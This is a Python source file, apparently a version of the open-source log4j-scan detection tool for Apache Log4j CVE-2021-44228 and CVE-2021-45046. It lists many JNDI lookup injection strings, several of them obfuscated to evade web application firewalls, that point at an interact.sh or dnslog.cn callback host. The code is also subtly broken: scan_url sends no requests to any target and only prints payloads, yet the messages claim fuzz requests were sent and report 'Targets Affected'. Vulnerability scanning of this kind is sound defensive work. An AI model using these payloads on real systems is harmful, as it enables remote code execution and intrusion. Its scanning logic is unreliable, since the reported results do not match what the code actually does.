#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import requests
import base64
import json
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")


post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}/{{random}}}",
                       "${jndi:rmi://{{callback_host}}}/",
                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}/{{random}}}",
                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                       "${jndi:dns://{{callback_host}}}",
                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                 ]

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--custom-waf-bypass-payload",
                    dest="custom_waf_bypass_payload",
                    help="Test with custom WAF bypass payload.")
parser.add_argument("--test-CVE-2021-45046",
                    dest="cve_2021_45046",
                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                    action='store_true')
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


if args.custom_waf_bypass_payload:
    waf_bypass_payloads.append(args.custom_waf_bypass_payload)


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def get_cve_2021_45046_payloads(callback_host, random_string):
    payloads = []
    for i in cve_2021_45046:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


class Dnslog(object):
    def __init__(self):
        self.s = requests.session()
        req = self.s.get("http://www.dnslog.cn/getdomain.php",
                         proxies=proxies,
                         timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self.s.get("http://www.dnslog.cn/getrecords.php",
                         proxies=proxies,
                         timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = proxies
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


def scan_url(_, callback_host):
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for _ in range(7))
    payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', random_string))

    if args.cve_2021_45046:
        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
        payloads = get_cve_2021_45046_payloads(f'{callback_host}', random_string)

    for payload in payloads:
        cprint(f"[•] PAYLOAD: {payload}", "cyan")


def main():
    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host = args.custom_dns_callback_host
    else:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh()
        elif args.dns_callback_provider == "dnslog.cn":
            dns_callback = Dnslog()
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    scan_url("", dns_callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads generated. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return

    cprint("[•] Payloads generated. Waiting for DNS OOB callbacks.", "cyan")
    input("Press Enter to continue...")
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets do not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Targets Affected", "yellow")
        for i in records:
            cprint(json.dumps(i), "yellow")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
